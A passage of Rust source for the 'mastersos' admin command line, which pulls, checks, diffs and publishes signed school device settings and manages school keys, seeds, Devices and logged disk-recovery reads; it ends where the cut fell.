//! The `mastersos` command line. Settings live in a local directory (`init`, `pull`, `check`,
//! `diff`, `publish`); the server holds no draft. Every command that touches the server speaks
//! protocol v1 through [`crate::server`], with the credentials of [`crate::auth`].
//!
//! Output is a table or the text itself for people; `--json` prints one JSON value for scripts,
//! and an error as `{"error": {"code", "message", "problems"}}`.

use std::path::{Path, PathBuf};
use std::process::ExitCode;

use clap::{Parser, Subcommand};
use serde::Deserialize;
use serde_json::{json, Value};

use mastersos_bundle::{AgeBand, ClassRole, Kind, OrgRole};

use crate::explain::{self as explain_mod, UserQuery};
use crate::server::{CliError, SchoolEntry, Server};
use crate::workdir::{self, Meta, Workdir};
use crate::OpError;

const EXIT_CODES: &str = "Exit codes: 0 success; 1 failure (network, sign-in, the server refused); \
2 `check` or `publish` found errors in the local settings (or `publish` found a secret rerouted without --allow-reroute), or the command line itself is wrong. \
With --json every command prints one JSON value on stdout; an error is {\"error\": {\"code\", \"message\", \"problems\"}}.";

#[derive(Parser)]
#[command(
    name = "mastersos",
    version,
    about = "MastersOS admin command line: edit a school's settings in a local directory (pull, edit manifest.toml, check, diff) and publish them; inspect Devices.",
    after_help = EXIT_CODES
)]
pub struct Cli {
    /// The server's address, an origin such as https://server.example (default: the directory's
    /// `mastersos.toml`, else the server of the saved sign-in)
    #[arg(long, global = true)]
    server: Option<String>,
    /// The school's id, a lowercase UUID (default: `school_id` in the settings directory's mastersos.toml, else the only school of this account)
    #[arg(long, global = true, value_name = "UUID")]
    school: Option<String>,
    /// Print one JSON value on stdout instead of text, and errors as {"error": {...}}: for scripts
    #[arg(long, global = true)]
    json: bool,
    /// Where this computer keeps what it verified of each server's published versions
    #[cfg_attr(not(windows), doc = "(default: ~/.config/mastersos/pins)")]
    #[cfg_attr(windows, doc = r"(default: %APPDATA%\mastersos\pins)")]
    #[arg(long, global = true, value_name = "DIR")]
    pin_dir: Option<PathBuf>,
    /// No person is answering: never ask (a choice that needs one is refused). It never confirms trusted keys: the first time a school is checked needs a person at a terminal, or each of the trusted keys given by --key-file or --trust-fingerprint
    #[arg(long, global = true)]
    yes: bool,
    /// The first time a school is checked without a person (--yes, --json, or no terminal): a fingerprint (xxxx-xxxx-xxxx-xxxx) from the School keys page; give one for each of the trusted keys that is not your --key-file
    #[arg(long = "trust-fingerprint", global = true, value_name = "FP", value_parser = parse_fingerprint)]
    trust_fingerprint: Vec<String>,
    #[command(subcommand)]
    cmd: Cmd,
}

#[derive(Subcommand)]
enum Cmd {
    /// Start a local settings directory for a school that has published nothing yet, approved by the school keys given
    Init {
        /// The directory to create (it must be empty or not exist)
        dir: PathBuf,
        /// A school key file, or `-` for the first line of stdin; give it once for each school key (two is good). Make one with `mastersos key new`, then register it with `mastersos key register`
        #[arg(long = "key-file", value_name = "PATH")]
        key_file: Vec<PathBuf>,
    },
    /// Download the latest published settings (checked on this computer, version by version) into a local directory
    Pull {
        /// The settings directory (default: the current directory)
        dir: Option<PathBuf>,
        /// Pull this published version instead of the latest
        #[arg(long)]
        version: Option<u64>,
        /// Overwrite local changes that are not published
        #[arg(long)]
        force: bool,
    },
    /// Check the local settings directory the way publishing would (no network)
    Check {
        /// The settings directory (default: the current directory)
        dir: Option<PathBuf>,
    },
    /// Show what changed in the local settings directory since the last pull (no network; secrets by name only)
    Diff {
        /// The settings directory (default: the current directory)
        dir: Option<PathBuf>,
    },
    /// Explain the local settings (no network): which user config a person gets, or what a Device gets
    #[command(subcommand)]
    Explain(ExplainCmd),
    /// Rewrite the local settings as format 3 (Device configs and user configs) with the same behaviour, then check them (no network)
    Migrate {
        /// The settings directory (default: the current directory)
        #[arg(long)]
        dir: Option<PathBuf>,
        /// Write manifest.toml instead of printing the new text
        #[arg(long)]
        write: bool,
    },
    /// Devices and their latest reports
    #[command(subcommand)]
    Devices(DevicesCmd),
    /// The Settings reference (Markdown), read on this computer (no network): the short version, one section, or all of it
    Spec {
        /// One section: an issue code (icon_invalid), a table name (config, group, config.apps.web, school.oidc) or top-level
        #[arg(value_name = "SECTION", conflicts_with = "full")]
        section: Option<String>,
        /// The whole reference (long)
        #[arg(long)]
        full: bool,
    },
    /// Publish the local settings directory: check, fill in secrets, stamp, upload, then approve with the school key file (--key-file)
    Publish {
        /// The settings directory (default: the current directory)
        dir: Option<PathBuf>,
        /// The school key file (keep it on a USB stick; only you should be able to read it), or `-` for the first line of stdin: check and approve on this computer. Required
        #[arg(long = "key-file", value_name = "PATH")]
        key_file: Option<PathBuf>,
        /// IT approves that secret NAME may go to its changed network (`secret_rerouted`); give it once per rerouted secret. Without it publish refuses. Never passed by an AI
        #[arg(long = "allow-reroute", value_name = "NAME")]
        allow_reroute: Vec<String>,
    },
    /// The school keys: make one, register it, list them, or add or remove one in the local settings directory
    #[command(subcommand)]
    Key(KeyCmd),
    /// Check every published version on this computer (the first time, you confirm the key fingerprints)
    Verify,
    /// Monthly check-in: confirm to every computer that the latest settings are current
    Heartbeat {
        /// The school key file (keep it on a USB stick; only you should be able to read it), or `-` for the first line of stdin
        #[arg(long = "key-file", value_name = "PATH")]
        key_file: PathBuf,
        /// How many days the check-in lasts, 1 to 31
        #[arg(long, default_value_t = 30, value_parser = clap::value_parser!(i64).range(1..=31))]
        days: i64,
    },
    /// A computer's disk recovery keys
    #[command(subcommand)]
    Recovery(RecoveryCmd),
    /// Seeds: the file a Device is installed with (its first trusted keys, server, school and fetch token)
    #[command(subcommand)]
    Seed(SeedCmd),
    /// Read a password twice without echo and print its yescrypt hash for the IT account (it_account.password_hash)
    HashPassword,
    /// Sign in to the server given with --server: confirm a code in the browser; the sign-in is saved for this user only
    Login {
        /// Print the address to open instead of opening the browser
        #[arg(long)]
        no_browser: bool,
    },
    /// Forget the sign-in saved by `mastersos login`
    Logout,
}

#[derive(Subcommand)]
enum ExplainCmd {
    /// The user config a person gets on each Group, and the rule (with its line in manifest.toml) that gives it
    User {
        /// The settings directory (default: the current directory)
        #[arg(long)]
        dir: Option<PathBuf>,
        /// The account kind: sso, local or guest
        #[arg(long, value_parser = parse_enum::<Kind>)]
        kind: Kind,
        /// The person is an administrator on the Device (not with --kind guest)
        #[arg(long)]
        admin: bool,
        /// The login name (default: `guest` with --kind guest, otherwise none, so no `user` condition matches)
        #[arg(long)]
        user: Option<String>,
        /// The person's role in the organisation: owner, admin or member (sso only)
        #[arg(long, value_parser = parse_enum::<OrgRole>)]
        org_role: Option<OrgRole>,
        /// A role in a class: teacher, assistant or student; give it once per --class (pairs by position), or once for every class. A role without a class matches only class_role conditions (sso only)
        #[arg(long, value_parser = parse_enum::<ClassRole>)]
        class_role: Vec<ClassRole>,
        /// A class id the person is in (sso only)
        #[arg(long)]
        class: Vec<String>,
        /// An org-tree node of the person, and each of its parents (sso only)
        #[arg(long)]
        org_node: Vec<String>,
        /// The person's age band: under13, 13-17 or 18+ (sso only)
        #[arg(long, value_parser = parse_enum::<AgeBand>)]
        age_band: Option<AgeBand>,
        /// The person's subject id at the sign-in service (sso only)
        #[arg(long)]
        sub: Option<String>,
        /// Only this Group (default: every Group)
        #[arg(long)]
        device_group: Option<String>,
    },
    /// The Group, device config, reachable user configs and installed apps of the Device with this serial number
    Device {
        /// The serial number
        serial: String,
        /// The settings directory (default: the current directory)
        #[arg(long)]
        dir: Option<PathBuf>,
    },
}

/// A value of one of the settings' lowercase names (`sso`, `teacher`, `13-17`, ...).
fn parse_enum<T: serde::de::DeserializeOwned>(s: &str) -> Result<T, String> {
    serde_json::from_value(Value::String(s.to_owned()))
        .map_err(|_| format!("{s:?} is not one of the values listed in --help"))
}

#[derive(Subcommand)]
enum KeyCmd {
    /// Create a school key on this computer, without the network. It is never written over an existing file. Prints only its key code and fingerprint
    New {
        /// The file to write, or an existing directory (the file is then named `<school>-school-key-<key code>.kit`)
        #[arg(long, value_name = "PATH")]
        out: PathBuf,
        /// A short school name for the file name, such as `alpha`
        #[arg(long = "school-name", value_name = "NAME")]
        school_name: Option<String>,
    },
    /// Register the school key with the server, then the disk unlocking that belongs to it
    Register {
        /// The school key file (keep it on a USB stick; only you should be able to read it), or `-` for the first line of stdin
        #[arg(long = "key-file", value_name = "PATH")]
        key_file: PathBuf,
        /// A name people will recognise (1 to 64 characters)
        #[arg(long, value_name = "TEXT")]
        label: String,
    },
    /// List the school keys registered for this school: key code, label, registered date, whether the latest published settings and the local directory have them, when each last signed
    List {
        /// The settings directory (default: the current directory)
        #[arg(long)]
        dir: Option<PathBuf>,
    },
    /// Add the school key in FILE (registered with `mastersos key register`) to the local manifest.toml; then publish with a school key already in use
    Add {
        /// The school key file, or `-` for the first line of stdin
        #[arg(value_name = "FILE")]
        file: PathBuf,
        /// The settings directory (default: the current directory)
        #[arg(long)]
        dir: Option<PathBuf>,
    },
    /// Remove the school key with this key code (for example 11d9-03eb) from the local manifest.toml (then publish), or with --unregister from the server
    Remove {
        /// The key code, with or without the dash
        #[arg(value_name = "KEY CODE")]
        code: String,
        /// That school key's file, if you still have it: then the disk-unlocking entry that belongs to it is removed too, even in an older manifest.toml
        #[arg(long = "key-file", value_name = "PATH")]
        key_file: Option<PathBuf>,
        /// The settings directory (default: the current directory)
        #[arg(long)]
        dir: Option<PathBuf>,
        /// Instead of editing the local manifest.toml, delete the school key (and its disk unlocking) from the server; refused while the latest published settings still use it
        #[arg(long)]
        unregister: bool,
    },
}

#[derive(Subcommand)]
enum RecoveryCmd {
    /// Unlock a computer's disk: open its stored recovery keys on this computer with the school key (every read is recorded on the server)
    Read {
        /// The computer's device id
        #[arg(value_name = "DEVICE")]
        device: String,
        /// The school key file (keep it on a USB stick; only you should be able to read it), or `-` for the first line of stdin
        #[arg(long = "key-file", value_name = "PATH")]
        key_file: PathBuf,
    },
}

#[derive(Subcommand)]
enum SeedCmd {
    /// Make a seed from the latest version verified on this computer (its trusted keys, min_version, the Group's Wi-Fi and IT account) and a fetch token from the server; written for this user only
    Make {
        /// The Group the Devices installed with this seed start in (default: the default Group)
        #[arg(long)]
        group: Option<String>,
        /// The seed file to write (owner-only). An existing file is replaced only with --yes, and never through a link
        #[arg(long, value_name = "FILE")]
        out: PathBuf,
        /// A settings directory whose mastersos.toml names the server and the school (default: the current directory, when it is one)
        #[arg(long, value_name = "DIR")]
        dir: Option<PathBuf>,
    },
    /// Check a seed against the chain verified on this computer: its trusted keys, min_version, server, school, the fetch token's shape and the fingerprints in its header. Exit 0 when it matches, 1 when not
    Check {
        /// The seed file
        #[arg(value_name = "FILE")]
        file: PathBuf,
        /// A settings directory whose mastersos.toml names the server and the school (default: the current directory, when it is one)
        #[arg(long, value_name = "DIR")]
        dir: Option<PathBuf>,
    },
}

#[derive(Subcommand)]
enum DevicesCmd {
    /// List Devices with their latest report
    List {
        /// Only Devices in this group
        #[arg(long)]
        group: Option<String>,
    },
    /// One Device's latest report (by device id or serial number)
    Show {
        /// The device id or its serial number
        device: String,
    },
}

/// The command line's entry point.
pub async fn main() -> ExitCode {
    let cli = match Cli::try_parse() {
        Ok(c) => c,
        Err(e) => return usage_error(e),
    };
    let json = cli.json;
    match run(cli).await {
        Ok(code) => code,
        Err(e) => {
            if json {
                crate::server::print_error(&op_error(&e), true);
            } else {
                if let OpError::Refused {
                    issues: Some(i), ..
                } = &e
                {
                    print_issues(i);
                }
                // The message never holds a token: only the address and the server's error text.
                eprintln!("mastersos: {}", e.message());
            }
            ExitCode::from(e.exit_code())
        }
    }
}

/// A command line that clap refuses: help and version as clap prints them; any other error exits
/// 2, as `{"error": ...}` on stdout when `--json` is among the arguments.
fn usage_error(e: clap::Error) -> ExitCode {
    use clap::error::ErrorKind;
    let json = std::env::args_os().any(|a| a == "--json");
    if !json
        || matches!(
            e.kind(),
            ErrorKind::DisplayHelp
                | ErrorKind::DisplayVersion
                | ErrorKind::DisplayHelpOnMissingArgumentOrSubcommand
        )
    {
        e.exit()
    }
    let text = e.render().to_string();
    let message = text.trim().strip_prefix("error: ").unwrap_or(text.trim());
    crate::server::print_error(&CliError::usage(&crate::safe::text(message)), true);
    ExitCode::from(2)
}

/// An [`OpError`] of a local command as the error `--json` prints.
fn op_error(e: &OpError) -> CliError {
    match e {
        OpError::Refused { message, issues } => {
            let mut c = CliError::new("check_failed", message);
            c.problems = issues.clone().unwrap_or_default();
            c
        }
        OpError::Usage(message) => CliError::usage(message),
        OpError::Failed(message) => CliError::new("local_file", message),
    }
}

/// Print what a protocol v1 command gave: its output, or its error (`--json` on stdout).
fn finish(r: Result<String, crate::server::CliError>, json: bool) -> ExitCode {
    match r {
        Ok(out) => {
            print!("{out}");
            ExitCode::SUCCESS
        }
        Err(e) => {
            crate::server::print_error(&e, json);
            ExitCode::from(u8::try_from(crate::server::exit_code(&e)).unwrap_or(1))
        }
    }
}

async fn run(cli: Cli) -> Result<ExitCode, OpError> {
    let Cli {
        server,
        school,
        json,
        pin_dir: pin_flag,
        yes,
        trust_fingerprint,
        cmd,
    } = cli;
    let pin_dir = || pin_dir_op(pin_flag.as_deref());
    let pins_read = || pins_to_read(pin_flag.as_deref()).map_err(|e| OpError::Failed(e.message));
    let o = V1 {
        json,
        yes,
        server,
        school,
        pin_flag: pin_flag.clone(),
        fingerprints: trust_fingerprint,
    };
    // Sign-in commands and the local reference: no credentials are read.
    match &cmd {
        Cmd::Login { no_browser } => {
            let r = crate::auth::login(o.server.as_deref(), *no_browser, json).await;
            return Ok(finish(r, json));
        }
        Cmd::Logout => return Ok(finish(crate::auth::logout(json), json)),
        Cmd::Spec { section, full } => {
            return Ok(finish(spec(section.as_deref(), *full, json), json))
        }
        _ => {}
    }
    // `seed check` exits 1 with its own report when the seed does not match.
    if let Cmd::Seed(SeedCmd::Check { file, dir }) = &cmd {
        return Ok(
            match seed_check_v1(&o, file, dir.as_deref(), o.school.as_deref()).await {
                Ok((out, ok)) => {
                    print!("{out}");
                    if ok {
                        ExitCode::SUCCESS
                    } else {
                        ExitCode::from(1)
                    }
                }
                Err(e) => finish(Err(e), json),
            },
        );
    }
    // The commands that talk to the server: credentials from arbella or `mastersos login`.
    if matches!(
        cmd,
        Cmd::Init { .. }
            | Cmd::Pull { .. }
            | Cmd::Verify
            | Cmd::Publish { .. }
            | Cmd::Heartbeat { .. }
            | Cmd::Recovery(_)
            | Cmd::Devices(_)
            | Cmd::Seed(_)
            | Cmd::Key(
                KeyCmd::Register { .. }
                    | KeyCmd::List { .. }
                    | KeyCmd::Add { .. }
                    | KeyCmd::Remove {
                        unregister: true,
                        ..
                    }
            )
    ) {
        return Ok(finish(v1_command(&o, cmd).await, json));
    }
    // The local commands: no server address, no credentials.
    match cmd {
        // Offline: the pins are read, never created.
        Cmd::Check { dir } => local_check(dir.as_deref(), &pins_read()?, json),
        Cmd::Diff { dir } => local_diff(dir.as_deref(), &pins_read()?),
        Cmd::Explain(c) => explain(&c, json),
        Cmd::Migrate { dir, write } => migrate(dir.as_deref(), &pin_dir()?, write, json),
        Cmd::HashPassword => hash_password(),
        Cmd::Key(KeyCmd::New { out, school_name }) => {
            Ok(finish(key_new(&out, school_name.as_deref(), json), json))
        }
        // Only the local manifest.toml changes, and nothing from the server decides what.
        Cmd::Key(KeyCmd::Remove {
            code,
            key_file,
            dir,
            ..
        }) => keys_remove(dir.as_deref(), &code, key_file.as_deref(), &o).await,
        Cmd::Login { .. }
        | Cmd::Logout
        | Cmd::Spec { .. }
        | Cmd::Init { .. }
        | Cmd::Pull { .. }
        | Cmd::Verify
        | Cmd::Publish { .. }
        | Cmd::Heartbeat { .. }
        | Cmd::Recovery(_)
        | Cmd::Devices(_)
        | Cmd::Seed(_)
        | Cmd::Key(KeyCmd::Register { .. } | KeyCmd::List { .. } | KeyCmd::Add { .. }) => {
            unreachable!("handled above")
        }
    }
}

/// `--trust-fingerprint`: four groups of four hex digits joined by `-`, taken in lowercase.
fn parse_fingerprint(s: &str) -> Result<String, String> {
    let fp = s.to_ascii_lowercase();
    let ok = fp.len() == 19
        && fp.split('-').count() == 4
        && fp
            .split('-')
            .all(|g| g.len() == 4 && g.bytes().all(|b| b.is_ascii_hexdigit()));
    if ok {
        Ok(fp)
    } else {
        Err("a fingerprint is four groups of four hex digits, like 1a2b-3c4d-5e6f-7a8b".into())
    }
}

/// Where the pins are kept: `--pin-dir`, else `pins` in this computer's settings folder. Nothing
/// is created: the offline commands only read pins.
fn pin_dir_path(flag: Option<&Path>) -> Result<PathBuf, CliError> {
    match flag {
        Some(d) => Ok(d.to_path_buf()),
        None => crate::platform::config_dir("mastersos")
            .map(|c| c.join("pins"))
            .map_err(|e| CliError::new("local_file", &format!("{e:#}"))),
    }
}

/// [`pin_dir_path`] for the offline commands, which only read pins: nothing is created, but an
/// existing directory that is a link or another user's is refused.
fn pins_to_read(flag: Option<&Path>) -> Result<PathBuf, CliError> {
    let dir = pin_dir_path(flag)?;
    crate::platform::private_dir(&dir, false)
        .map_err(|e| CliError::new("local_file", &format!("{e:#}")))?;
    Ok(dir)
}

/// [`pin_dir_path`] for the commands that verify a chain: the settings folder and the pins
/// directory are made private (0700; refused when a link or another user's).
fn resolve_pin_dir(flag: Option<&Path>) -> Result<PathBuf, CliError> {
    let local = |e: anyhow::Error| CliError::new("local_file", &format!("{e:#}"));
    let dir = pin_dir_path(flag)?;
    if flag.is_none() {
        if let Some(cfg) = dir.parent() {
            crate::platform::private_dir(cfg, true).map_err(local)?;
        }
    }
    crate::platform::private_dir(&dir, true).map_err(local)?;
    Ok(dir)
}

/// [`resolve_pin_dir`] for the commands that still report an [`OpError`].
fn pin_dir_op(flag: Option<&Path>) -> Result<PathBuf, OpError> {
    resolve_pin_dir(flag).map_err(|e| OpError::Failed(e.message))
}

/// `mastersos key new`: no network. The school key itself is never printed.
fn key_new(out: &Path, school_name: Option<&str>, json: bool) -> Result<String, CliError> {
    let (k, path) = crate::sign::kit::kit_new_in(out, school_name).map_err(local_file)?;
    let code = mastersos_bundle::keyid::key_code(&k.key_id).unwrap_or_else(|| k.key_id.clone());
    let shown = std::path::absolute(&path).unwrap_or(path);
    if json {
        return Ok(format!(
            "{}\n",
            json!({"key_code": code, "key_id": k.key_id, "fingerprint": k.fingerprint, "path": shown.display().to_string()})
        ));
    }
    Ok(format!(
        "key code:    {code}\nfingerprint: {}\nschool key:  {}\nPrint the school key file on paper and lock the printout away, register it with `mastersos key register --key-file <file>`, then move the file to a USB stick and delete it from this computer.\n",
        k.fingerprint,
        shown.display()
    ))
}

/// `mastersos spec [SECTION] [--full]`: the Settings reference as this version of mastersos
/// carries it; no network and no credentials.
fn spec(section: Option<&str>, full: bool, json: bool) -> Result<String, CliError> {
    let text = match (section, full) {
        (Some(id), _) => mastersos_bundle::spec::section(id).ok_or_else(|| {
            let mut e = CliError::usage(&format!(
                "there is no section {:?} in the Settings reference; the sections are listed in the error's problems (--json) or with `mastersos spec --full`",
                crate::safe::field(id)
            ));
            e.problems = mastersos_bundle::spec::section_ids()
                .into_iter()
                .map(Value::String)
                .collect();
            e
        })?,
        (None, true) => mastersos_bundle::spec::MANIFEST_SPEC.to_owned(),
        (None, false) => mastersos_bundle::spec::prompt_spec(),
    };
    if json {
        return Ok(format!("{}\n", json!({ "text": text })));
    }
    Ok(if text.ends_with('\n') {
        text
    } else {
        format!("{text}\n")
    })
}

/// One value for a table cell or a line.
fn cell(v: &Value) -> String {
    match v {
        Value::Null => "-".into(),
        Value::String(s) => s.clone(),
        Value::Array(a) => a.iter().map(cell).collect::<Vec<_>>().join(", "),
        other => other.to_string(),
    }
}

fn table(headers: &[&str], rows: Vec<Vec<String>>) -> String {
    let mut widths: Vec<usize> = headers.iter().map(|h| h.chars().count()).collect();
    for r in &rows {
        for (w, c) in widths.iter_mut().zip(r) {
            *w = (*w).max(c.chars().count());
        }
    }
    let line = |cells: Vec<&str>| {
        let mut s = String::new();
        for (i, (c, w)) in cells.iter().zip(&widths).enumerate() {
            if i + 1 == cells.len() {
                s.push_str(c);
            } else {
                s.push_str(c);
                s.push_str(&" ".repeat(w - c.chars().count() + 2));
            }
        }
        s.trim_end().to_owned()
    };
    let mut out = vec![line(headers.to_vec())];
    out.extend(
        rows.iter()
            .map(|r| line(r.iter().map(String::as_str).collect())),
    );
    out.join("\n")
}

fn fail(e: impl std::fmt::Display) -> OpError {
    OpError::Failed(format!("{e:#}"))
}

/// The settings directory, its base checked against this computer's pins.
fn open_dir(dir: Option<&Path>, pins: &Path) -> Result<Workdir, OpError> {
    Ok(Workdir::open(dir.unwrap_or_else(|| Path::new(".")))
        .map_err(fail)?
        .with_pins(pins))
}

fn lint_values(lints: &[mastersos_bundle::Lint]) -> Vec<Value> {
    lints
        .iter()
        .map(|l| serde_json::to_value(l).unwrap_or(Value::Null))
        .collect()
}

/// What `mastersos check` prints after the issues when secrets are rerouted: publishing stops
/// on them until IT approves each one by name.
fn reroute_notice(lints: &[mastersos_bundle::Lint]) -> Option<String> {
    // `rerouted_names` keeps only valid names (a-z, 0-9, -); checked again here because the
    // names go into a command IT may paste.
    let names = mastersos_bundle::secret_ref::rerouted_names(lints);
    if names.is_empty()
        || !names
            .iter()
            .all(|n| mastersos_bundle::secret_ref::is_valid_name(n))
    {
        return None;
    }
    let names: Vec<String> = names.into_iter().collect();
    let flags: Vec<String> = names
        .iter()
        .map(|n| format!("--allow-reroute={n}"))
        .collect();
    Some(format!(
        "\n!! SECRET REROUTED: {} would be sent to a changed network.\n!! `mastersos publish` refuses until IT checks the change (`mastersos diff`) and approves it:\n!!   mastersos publish {}\n!! Only IT decides this; an AI assistant never passes --allow-reroute.",
        names.join(", "),
        flags.join(" ")
    ))
}

/// `mastersos check`: the lints of the local directory; exit code 2 when any is an error.
fn local_check(dir: Option<&Path>, pins: &Path, json: bool) -> Result<ExitCode, OpError> {
    let lints = workdir::check(&open_dir(dir, pins)?).map_err(fail)?;
    if json {
        println!("{}", check_result(&lints));
    } else {
        print_issues(&lint_values(&lints));
        if let Some(n) = reroute_notice(&lints) {
            println!("{n}");
        }
    }
    Ok(if mastersos_bundle::has_errors(&lints) {
        ExitCode::from(2)
    } else {
        ExitCode::SUCCESS
    })
}

/// `mastersos diff`.
fn local_diff(dir: Option<&Path>, pins: &Path) -> Result<ExitCode, OpError> {
    print!("{}", workdir::diff(&open_dir(dir, pins)?).map_err(fail)?);
    Ok(ExitCode::SUCCESS)
}

/// The local directory's manifest.toml, as text and parsed as a draft (`version` and `issued_at`
/// may be left out). A text that does not parse is refused with its issue.
fn local_manifest(
    dir: Option<&Path>,
) -> Result<(Workdir, String, mastersos_bundle::Manifest), OpError> {
    let w = Workdir::open(dir.unwrap_or_else(|| Path::new("."))).map_err(fail)?;
    let text = w.manifest().map_err(fail)?;
    let m = mastersos_bundle::check::parse_draft(&text).map_err(|l| OpError::Refused {
        message: "manifest.toml does not parse (see `mastersos check`)".into(),
        issues: Some(lint_values(&[l])),
    })?;
    Ok((w, text, m))
}

/// `mastersos explain user` and `mastersos explain device`.
fn explain(c: &ExplainCmd, json: bool) -> Result<ExitCode, OpError> {
    match c {
        ExplainCmd::User {
            dir,
            kind,
            admin,
            user,
            org_role,
            class_role,
            class,
            org_node,
            age_band,
            sub,
            device_group,
        } => {
            // As on a Device (`guest_user_config`): the guest session is never an administrator.
            if *kind == Kind::Guest && *admin {
                return Err(OpError::Usage(
                    "--admin does not apply to --kind guest: the guest session is never an administrator on a Device".into(),
                ));
            }
            let (_, text, m) = local_manifest(dir.as_deref())?;
            if let Some(g) = device_group {
                if !m.groups.iter().any(|x| &x.id == g) {
                    return Err(OpError::Usage(format!(
                        "there is no Group {g:?} in manifest.toml"
                    )));
                }
            }
            if m.user_layer.as_ref().is_some_and(|u| u.fallback.is_none()) {
                let loc = mastersos_bundle::check::Locator::new(&text);
                let issues: Vec<_> = m
                    .validate_all(&Default::default())
                    .into_iter()
                    .filter(|l| l.code == "user_fallback_missing")
                    .map(|mut l| {
                        if let (Some(loc), Some(p)) = (&loc, &l.path) {
                            l.span = loc.locate(p);
                        }
                        l
                    })
                    .collect();
                return Err(OpError::Refused {
                    message: "manifest.toml has no [user] fallback (see `mastersos check`)".into(),
                    issues: Some(lint_values(&issues)),
                });
            }
            let classes = explain_mod::class_facts(class, class_role).map_err(OpError::Failed)?;
            let any_fact = org_role.is_some()
                || !classes.is_empty()
                || !org_node.is_empty()
                || age_band.is_some()
                || sub.is_some();
            if any_fact && *kind != Kind::Sso {
                eprintln!(
                    "mastersos: issuer facts count only for sso accounts; they are ignored here"
                );
            }
            // As on a Device (design §5): without `mastersos_claims = true` the issuer sends no
            // facts, so fact conditions never match.
            let claims = m.school.oidc.as_ref().is_some_and(|o| o.mastersos_claims);
            if any_fact && *kind == Kind::Sso && !claims {
                eprintln!("mastersos: fact flags ignored: school.oidc.mastersos_claims is not true, so Devices receive no facts");
            }
            let facts =
                (any_fact && *kind == Kind::Sso && claims).then(|| mastersos_bundle::IssuerFacts {
                    sub: sub.clone().unwrap_or_default(),
                    org: m.school.id.clone().unwrap_or_default(),
                    org_role: *org_role,
                    org_nodes: org_node.clone(),
                    classes,
                    age_band: *age_band,
                });
            let q = UserQuery {
                kind: *kind,
                admin: *admin,
                // A Device signs the guest session in as user "guest".
                user: user.clone().unwrap_or_else(|| {
                    if *kind == Kind::Guest {
                        "guest".into()
                    } else {
                        String::new()
                    }
                }),
                facts,
            };
            let out = explain_mod::explain_user(&m, &text, &q, device_group.as_deref());
            if let Some(e) = out
                .iter()
                .find(|e| mastersos_bundle::user_config(&m, &e.user_config).is_none())
            {
                return Err(OpError::Failed(format!(
                    "Group {:?} gives user config {:?}, which does not exist (see `mastersos check`)",
                    e.group, e.user_config
                )));
            }
            if json {
                println!("{}", serde_json::to_value(&out).map_err(fail)?);
                return Ok(ExitCode::SUCCESS);
            }
            for e in &out {
                let why = match (e.rule, e.line) {
                    _ if m.user_layer.is_none() => format!("implied: format {}", m.format),
                    (Some(i), Some(l)) => format!("rule assign[{i}], manifest.toml:{l}"),
                    (Some(i), None) => format!("rule assign[{i}]"),
                    (None, _) => "fallback".into(),
                };
                println!("group {}: {} ({why})", e.group, e.user_config);
            }
            Ok(ExitCode::SUCCESS)
        }
        ExplainCmd::Device { serial, dir } => {
            let (_, _, m) = local_manifest(dir.as_deref())?;
            let d = explain_mod::explain_device(&m, serial).map_err(OpError::Failed)?;
            if json {
                println!("{}", serde_json::to_value(&d).map_err(fail)?);
                return Ok(ExitCode::SUCCESS);
            }
            let list = |v: &[String]| {
                if v.is_empty() {
                    "(none)".to_owned()
                } else {
                    v.join(", ")
                }
            };
            let how = match d.source {
                mastersos_bundle::GroupSource::Bundle => "its [[device]] entry",
                _ => "no [[device]] entry: the default Group",
            };
            println!("group: {} ({how})", d.group);
            println!("device config: {}", d.device_config);
            println!("user configs: {}", list(&d.user_configs));
            println!("flatpak: {}", list(&d.flatpak));
            println!("deb: {}", list(&d.deb));
            Ok(ExitCode::SUCCESS)
        }
    }
}

/// What `mastersos migrate` tells IT on stderr about the format 3 text.
fn migrate_notes(legacy: bool) -> String {
    let mut notes = vec![
        "The keys that moved into [[device_config]], [[user_config]] and the defaults lose their comments.",
        "Every Device also installs the Flatpak and .deb apps of the fallback user config (the default Group's), legacy browser Groups included; once Devices run a format 3 agent, those apps show in the Dash only where a user config lists them.",
        "Publishing a format 3 text is refused (`feature_unsupported` for `format_3`, or `format_unsupported`) until every Device seen in the last 30 days reports `format_3`; the refusal names the Devices that are too old.",
    ];
    if legacy {
        notes.push("The settings were in the legacy shape (Groups holding the settings): the secret references now belong to configs, so the first publish needs `--allow-reroute` for each secret it names.");
    }
    notes.iter().map(|n| format!("note: {n}\n")).collect()
}

/// `mastersos migrate`: the format 3 text on stdout (or written with `--write`), then the local
/// check of that text; exit code 2 when the check finds errors or the text is already format 3.
fn migrate(dir: Option<&Path>, pins: &Path, write: bool, json: bool) -> Result<ExitCode, OpError> {
    let w = open_dir(dir, pins)?;
    let text = w.manifest().map_err(fail)?;
    let new = mastersos_bundle::migrate::to_format3(&text).map_err(|e| match e {
        mastersos_bundle::migrate::MigrateError::AlreadyFormat3 => OpError::Refused {
            message: e.to_string(),
            issues: None,
        },
        e => fail(e),
    })?;
    let legacy = mastersos_bundle::check::parse_draft(&text)
        .is_ok_and(|m| m.shape == mastersos_bundle::Shape::Legacy);
    let lints = if write {
        w.write_manifest(&new).map_err(fail)?;
        workdir::check(&w).map_err(fail)?
    } else {
        workdir::check_manifest(&w, &new).map_err(fail)?
    };
    if json {
        let mut v = json!({
            "written": write,
            "check": check_result(&lints),
        });
        if !write {
            v["text"] = Value::String(new);
        }
        println!("{v}");
    } else {
        let mut report = issues_text(&lint_values(&lints));
        if let Some(n) = reroute_notice(&lints) {
            report.push_str(&format!("{n}\n"));
        }
        if write {
            println!(
                "Wrote format 3 settings to {}.",
                w.root.join("manifest.toml").display()
            );
            print!("{report}");
        } else {
            // stdout holds only the text, so it can be redirected to a file.
            print!("{new}");
            eprint!("{report}");
        }
    }
    eprint!("{}", migrate_notes(legacy));
    Ok(if mastersos_bundle::has_errors(&lints) {
        ExitCode::from(2)
    } else {
        ExitCode::SUCCESS
    })
}

/// A school key file read for `init` or `key add`.
struct SchoolKey {
    kit: mastersos_bundle::kit::Kit,
}

impl SchoolKey {
    fn code(&self) -> String {
        workdir::shown_code(&self.kit.key_id())
    }
}

/// Read the school key files (one key given twice counts once).
fn load_school_keys(paths: &[PathBuf]) -> Result<Vec<SchoolKey>, OpError> {
    let mut out: Vec<SchoolKey> = Vec::new();
    for p in paths {
        let kit = crate::sign::kit::load_key_file(p).map_err(fail)?;
        if !out.iter().any(|k| k.kit.key_id() == kit.key_id()) {
            out.push(SchoolKey { kit });
        }
    }
    Ok(out)
}

fn absolute(p: &Path) -> Result<PathBuf, OpError> {
